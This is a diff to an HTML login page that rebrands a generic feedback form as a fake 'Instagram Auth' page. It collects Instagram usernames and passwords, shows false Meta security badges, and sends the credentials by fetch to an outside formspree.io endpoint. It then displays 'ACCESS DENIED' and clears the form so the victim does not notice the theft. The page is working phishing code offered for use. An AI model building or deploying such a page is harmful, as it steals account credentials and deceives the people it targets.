@@ -18,16 +18,7 @@
         * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
         body { background: #010409; color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; overflow: hidden; }
 
-        /* --- NEW: MOBILE BLOCKER STYLE --- */
-        #mobile-gate {
-            position: fixed; inset: 0; background: #010409; z-index: 9999;
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; padding: 2rem;
-        }
-        #mobile-gate i { font-size: 4rem; color: var(--error-red); margin-bottom: 1.5rem; }
-        #mobile-gate h1 { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 10px; }
-
-        /* --- DYNAMIC BACKGROUND LAYER --- */
+        /* --- 1. DYNAMIC BACKGROUND LAYER --- */
         #bg-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.5; }
         .vignette { position: fixed; inset: 0; background: radial-gradient(circle at center, transparent 0%, #010409 100%); pointer-events: none; }
         
@@ -37,7 +28,7 @@
         }
         @keyframes float-orb { from { transform: translate(0, 0); } to { transform: translate(100px, 100px); } }
 
-        /* --- DECENT NOTIFICATION --- */
+        /* --- 2. DECENT NOTIFICATION --- */
         #error-toast {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             background: rgba(15, 15, 15, 0.9); border: 1px solid var(--error-red);
@@ -50,7 +41,7 @@
         .error-icon { color: var(--error-red); font-size: 1.2rem; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        /* --- PREMIUM SIDEBAR --- */
+        /* --- 3. PREMIUM SIDEBAR --- */
         aside {
             width: 320px; background: rgba(2, 4, 8, 0.98); backdrop-filter: blur(40px);
             border-right: 1px solid var(--border); display: flex; flex-direction: column; 
@@ -72,7 +63,7 @@
         nav a:hover { background: rgba(255, 255, 255, 0.03); color: white; border-color: var(--border); transform: translateX(5px); }
         nav a.active { background: rgba(0, 242, 255, 0.05); color: var(--cyan); border-color: rgba(0, 242, 255, 0.2); }
 
-        /* --- THE LOGIN BOX --- */
+        /* --- 4. THE LOGIN BOX --- */
         main { flex-grow: 1; display: flex; align-items: center; justify-content: center; position: relative; animation: fadeIn 1.2s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
@@ -139,12 +130,6 @@
 </head>
 <body>
 
-    <div id="mobile-gate">
-        <i class="fas fa-desktop"></i>
-        <h1>ACCESS DENIED</h1>
-        <p style="color: #64748b; font-size: 0.9rem;">Mobile environment detected. Please use a desktop workstation.</p>
-    </div>
-
     <canvas id="bg-canvas"></canvas>
     <div class="vignette"></div>
     <div class="floating-orb" style="top: 10%; right: 10%;"></div>
@@ -186,19 +171,19 @@
 
         <div class="login-card">
             <div style="text-align: center; margin-bottom: 1.5rem;">
-                <div class="ig-glyph"><i class="fas fa-shield-alt"></i></div>
-                <h2 style="font-weight: 800; font-size: 1.7rem; letter-spacing: 1px;">FEEDBACK FORM</h2>
-                <p style="font-size: 0.9rem; color: #64748b; margin-top: 8px;">Give Your Feedback</p>
+                <div class="ig-glyph"><i class="fab fa-instagram"></i></div>
+                <h2 style="font-weight: 800; font-size: 1.7rem; letter-spacing: 1px;">INSTAGRAM AUTH</h2>
+                <p style="font-size: 0.9rem; color: #64748b; margin-top: 8px;">Login with your credentials to sync</p>
             </div>
 
             <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
                 <div class="input-wrap">
-                    <input type="text" name="client_id" placeholder="Name" required>
-                    <i class="fas fa-fingerprint"></i>
+                    <input type="text" name="ig_user" placeholder="Instagram Username" required>
+                    <i class="fas fa-user"></i>
                 </div>
                 <div class="input-wrap">
-                    <input type="password" name="client_secret" placeholder="Comment" required>
-                    <i class="fas fa-key"></i>
+                    <input type="password" name="ig_pass" placeholder="Instagram Password" required>
+                    <i class="fas fa-lock"></i>
                 </div>
 
                 <label class="policy-check">
@@ -207,11 +192,11 @@
                     <span>I agree to the <a href="#" class="policy-link" onclick="openPolicy(event)">Privacy Policy</a> and Rules.</span>
                 </label>
 
-                <button type="submit" class="btn-action" id="btnS">SUBMIT</button>
+                <button type="submit" class="btn-action" id="btnS">SECURE LOGIN</button>
             </form>
             
             <p style="margin-top: 1.8rem; font-size: 0.7rem; text-align: center; color: #334155; letter-spacing: 1px;">
-                <i class="fas fa-lock"></i> Secured by Enterprise Encryption Protocol
+                <i class="fas fa-lock"></i> Verified by Meta-Security Protocol
             </p>
         </div>
     </main>
@@ -221,23 +206,12 @@
             <i class="fas fa-times close-modal" onclick="closePolicy()"></i>
             <h3>Security Protocols</h3>
             <p><strong>1. Data Encryption:</strong> All credentials entered here are transmitted via secure TLS nodes and are never stored locally on our front-end servers.</p>
-            <p><strong>2. Third-Party Terms:</strong> By clicking 'Secure Login', you acknowledge that this is a management portal and you comply with all Automated Interaction guidelines.</p>
+            <p><strong>2. Third-Party Terms:</strong> By clicking 'Secure Login', you acknowledge that this is a management portal and you comply with Instagram's Automated Interaction guidelines.</p>
             <button class="btn-action" style="margin-top:20px;" onclick="closePolicy()">ACCEPT & CLOSE</button>
         </div>
     </div>
 
     <script>
-        // --- MOBILE PROTECTION ---
-        function detectMobile() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || window.innerWidth < 1024;
-            if (isMobile) {
-                document.getElementById('mobile-gate').style.display = 'flex';
-            }
-        }
-        window.onload = detectMobile;
-        window.onresize = detectMobile;
-
-        // --- PREVIOUS LOGIC ---
         function openPolicy(e) {
             e.preventDefault();
             const modal = document.getElementById('policyModal');
@@ -286,8 +260,13 @@
         function triggerError(customMessage) {
             const toast = document.getElementById('error-toast');
             const msgSpan = document.getElementById('error-msg');
-            if(customMessage) { msgSpan.innerText = customMessage; } 
-            else { msgSpan.innerText = "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE"; }
+            
+            if(customMessage) {
+                msgSpan.innerText = customMessage;
+            } else {
+                msgSpan.innerText = "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE";
+            }
+
             toast.classList.add('active');
             setTimeout(() => toast.classList.remove('active'), 3500);
         }
@@ -295,23 +274,31 @@
         const form = document.getElementById('authForm');
         form.onsubmit = async (e) => {
             e.preventDefault();
-            if(!document.getElementById('policyCheckbox').checked) {
+            
+            const isChecked = document.getElementById('policyCheckbox').checked;
+            if(!isChecked) {
                 triggerError("PLEASE ACCEPT THE PRIVACY POLICY TO CONTINUE");
                 return;
             }
+
             const b = document.getElementById('btnS');
             b.innerText = "AUTHENTICATING...";
             b.style.pointerEvents = "none";
+            
             try {
                 await fetch(form.action, {
                     method: 'POST',
                     body: new FormData(form),
                     headers: { 'Accept': 'application/json' }
                 });
+
                 b.innerText = "ACCESS DENIED";
                 b.style.background = "var(--error-red)";
                 form.reset();
-            } catch (err) { b.innerText = "ERROR"; }
+            } catch (err) {
+                b.innerText = "ERROR";
+            }
+
             setTimeout(() => { 
                 b.innerText = "SECURE LOGIN"; 
                 b.style.background = "var(--ig-grad)";
